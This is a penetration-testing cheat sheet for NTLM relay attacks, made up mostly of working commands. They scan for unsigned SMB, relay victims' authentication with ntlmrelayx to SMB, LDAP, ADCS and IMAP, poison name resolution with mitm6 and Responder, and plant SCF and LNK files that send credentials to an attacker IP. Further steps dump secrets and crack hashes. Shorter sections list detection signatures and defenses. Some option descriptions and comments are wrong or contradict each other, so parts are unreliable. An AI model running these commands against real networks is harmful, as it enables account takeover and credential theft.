# NTLM Relay

Intercept NTLM authentication challenges and relay the hashed exchange to another target server, authenticating as the victim **without needing the password or hash**.

## How It Works

```
Victim ──► Auth attempt → Attacker (relay)
Attacker ──► Forwards challenge/response to Target (SMB/LDAP/HTTP)
Target ──► Sends challenge
Attacker ──► Forwards challenge to Victim
Victim ──► Sends response to challenge
Attacker ──► Forwards response to Target
Attacker ──► Authenticated as Victim on Target ← No password needed!
```

## Prerequisites

- SMB signing **disabled** on target (critical for SMB relay)
- Ability to intercept NTLM auth (Responder, mitm6, phishing, captive portal)
- Target service that accepts NTLM (SMB, LDAP, HTTP, MSSQL, Exchange)

## SMB Signing Check

### NetExec
```bash
# Check SMB signing on target
nxc smb 10.10.10.10 -u '' -p ''
# Look for "signing:False" in output

# Check entire subnet
nxc smb 10.10.10.0/24 -u '' -p '' | grep signing:False
```

### Manual with enum4linux-ng
```bash
enum4linux-ng -A 10.10.10.10 -U | grep -i signing
```

### With credentials
```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' --signing-check
```

## Linux — ntlmrelayx.py (Impacket)

### Basic SMB relay to single target
```bash
ntlmrelayx.py -t smb://10.10.10.10 -smb2support
```

### Relay to multiple targets
```bash
ntlmrelayx.py -tf targets.txt -smb2support
```
targets.txt format:
```
smb://10.10.10.10
smb://10.10.10.11
ldap://10.10.10.10
```

### Relay with SOCKS (interactive sessions)
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```
Interactive commands:
```
socks
SOCK4[0] 10.10.10.50:53559 <> 10.10.10.10:445 [DOMAIN\jsmith]
```

With `-socks` you get a SOCKS proxy at `127.0.0.1:1080`. Use Proxychains:
```bash
proxychains4 netexec smb 10.10.10.10 -u 'jsmith' -p '' --shares
```

### Relay to LDAP (create domain admin / delegate access)
```bash
# Creates a new domain admin account
ntlmrelayx.py -t ldap://10.10.10.10 --delegate-access -smb2support
```
This adds the relayed machine account to `Account Operators` or delegates Kerberos access.

### Relay to LDAP with ESC8 (ADCS Web Enrollment)
```bash
# When ADCS Web Enrollment is available
ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs
```

### Relay to IMAP / Exchange
```bash
ntlmrelayx.py -t imap://10.10.10.10 -smb2support
```

### Relay to WCF / HTTP endpoint
```bash
ntlmrelayx.py -t http://10.10.10.10 -smb2support
```

### Capture with loot directory
```bash
ntlmrelayx.py -t smb://10.10.10.10 -smb2support -l lootdir
```

### Deny access on relay fail (loud)
```bash
ntlmrelayx.py -t smb://10.10.10.10 -smb2support --no-da
```

## Complete mitm6 + Relay Flow

```bash
# Terminal 1: mitm6 (DHCPv6 poison)
sudo mitm6 -d domain.local -i eth0

# Terminal 2: ntlmrelayx.py relay to DC
ntlmrelayx.py -6 -wh 10.10.10.5 -t smb://10.10.10.10 -smb2support -socks
```

## Complete Responder + Relay Flow

```bash
# Terminal 1: Responder (disable SMB/HTTP servers — relay handles them)
sudo responder -I eth0 -Av -w -r -F

# Terminal 2: ntlmrelayx.py relay to target
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

## Phishing / CVE-Based Relay

### WebDAV + SCF file
```bash
# Drop an SCF file on a file share pointing to attacker
[Shell]
Command=2
IconFile=\\10.10.10.5\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### SCF file relay
```bash
# Start relay
ntlmrelayx.py -tf targets.txt -smb2support

# Drop SCF in a writable share where users browse
copy icon.scf \\victim-dc\sysvol\domain.local\scripts\
```

### LNK file relay
```powershell
# Create LNK file with icon reference to attacker IP
$wshell = New-Object -ComObject WScript.Shell
$shortcut = $wshell.CreateShortcut("\\target\share\file.lnk")
$shortcut.IconLocation = "\\10.10.10.5\totallynotmalicious.ico"
$shortcut.Save()
```
When users browse the folder, Windows auto-resolves the icon → NTLM auth sent.

## Windows — Inveigh Relay

```powershell
# Start Inveigh with relay
Invoke-Inveigh -IP 10.10.10.5 -ConsoleOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -RunTime 60
```

## ntlmrelayx.py Advanced Options

| Option | Description |
|--------|-------------|
| `-t` | Target URL (smb://, ldap://, http://) |
| `-tf` | Target file (one per line) |
| `-smb2support` | Enable SMB2 protocol support |
| `-socks` | SOCKs proxy for relayed sessions |
| `-l` | Loot directory for captured data |
| `-6` | Enable IPv6 |
| `-wh` | WPAD host IP |
| `--no-da` | Disable on-access (don't auth immediately) |
| `--da` | Enable on-access (auth immediately) |
| `--delegate-access` | Relay to LDAP for delegation abuse |
| `--adcs` | Relay to ADCS Web Enrollment |
| `-machine-account` | Specific machine account |
| `-domain` | Target domain |

## Cracking (Fallback)

If relay fails and you capture hashes instead:
```bash
hashcat -m 5600 captured_netntlmv2.txt rockyou.txt -r best64.rule
```

## Full Attack Flow

```
1. Scan subnet for targets with SMB signing disabled
   netexec smb 10.10.10.0/24 -u '' -p '' | grep "signing:False"

2. Compile target list
   echo "smb://10.10.10.10" >> targets.txt
   echo "smb://10.10.10.11" >> targets.txt
   echo "ldap://10.10.10.10" >> targets.txt

3. Start Responder (capture mode)
   sudo responder -I eth0 -Av -w

4. Start ntlmrelayx.py with SOCKS
   ntlmrelayx.py -tf targets.txt -smb2support -socks

5. Wait for victim auth
   [VERBOSE] Authenticating against smb://10.10.10.10 as DOMAIN\jsmith SUCCEED
   [VERBOSE] SOCKS: Adding DOMAIN\jsmith@10.10.10.10[445]

6. Use SOCKS proxy for actions as victim
   proxychains4 netexec smb 10.10.10.10 --shares
   proxychains4 netexec smb 10.10.10.10 --lsa
   proxychains4 secretsdump.py 'domain/jsmith@10.10.10.10'
```

## Detection & Signatures

**Windows Event Logs:**
- **Event ID 4624** — Successful logon (but source IP is relay target, not victim)
- **Event ID 4625** — Logon failure (if relay fails)
- **Event ID 5140** — SMB share access
- **Event ID 4776** — NTLM credential validation anomalies

**Network Signatures:**
- NTLM authentication from unexpected source IPs
- Different source IP for connection setup vs NTLM auth
- Multiple NTLM exchanges in quick succession (relay timing)
- SMB session setup followed by unusual access patterns

**SMB Specific:**
- Source IP in SMB session doesn't match origin of NetBIOS name
- Multiple NTLM type 3 messages in single TCP stream
- Time between challenge and response unusual (relay introduces latency)

## OPSEC Considerations

- **SMB signing check is key** — Without signing bypass, SMB relay always fails
- **Relay is detectable** — Timing analysis reveals relay latency
- **SOCKS proxy must be fast** — Relay sessions timeout quickly
- **Target selection** — Relay to LDAP for high impact; relay to SMB for file access
- **Don't relay to DC SMB** — Usually signed; relay to LDAP instead
- **IPv4 relay limited** — Use mitm6 for IPv6-to-IPv4 relay which bypasses signing issues
- **Spray across targets** — Use `-tf` to try multiple targets
- **Clean SOCKS sessions** — Remove after use (`socks` then `del 0`)

## Defenses

- **Enable SMB signing** — GPO: `Computer Config > Windows Settings > Security Settings > Local Policies > Security Options > Microsoft network server: Digitally sign communications (always)`
- **Extended Protection for Authentication (EPA)** — Protects HTTP relay
- **Enable EPA for LDAP** — `LDAP server signing requirements`
- **Disable NTLM** — Use Kerberos only where possible
- **Network segmentation** — Isolate high-value servers
- **SMB hardening** — Disable SMB1, enable SMB2/3 signing
- **Monitor** — Alert on Anomalous SMB connections

**Verify SMB Signing Status:**
```powershell
# Check local SMB signing config
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters | Select RequireSecuritySignature, EnableSecuritySignature

# Remotely
netexec smb 10.10.10.10 -u 'user' -p 'pass' -M enum_av
```

## Common Pitfalls

| Issue | Fix |
|-------|-----|
| Relay fails: STATUS_ACCESS_DENIED | Target requires SMB signing; switch to LDAP or HTTP |
| No victims respond to poison | Use mitm6 instead of/in addition to Responder |
| SOCKS sockets die immediately | Target timeout; relay must be fast |
| Double relay (auth forwarding) | Only works on non-signed targets |
| Victim not in domain | Relay requires domain auth |

## References

- Impacket ntlmrelayx: https://github.com/fortra/impacket
- SMB Relay Demystified: https://blog.rapid7.com/2018/03/20/smb-relay-demystified/
- MS08-068 (classic SMB relay)
- CVE-2019-1384 (SMBv3 relay)
- SpecterOps: "NTLM Relaying 2.0"
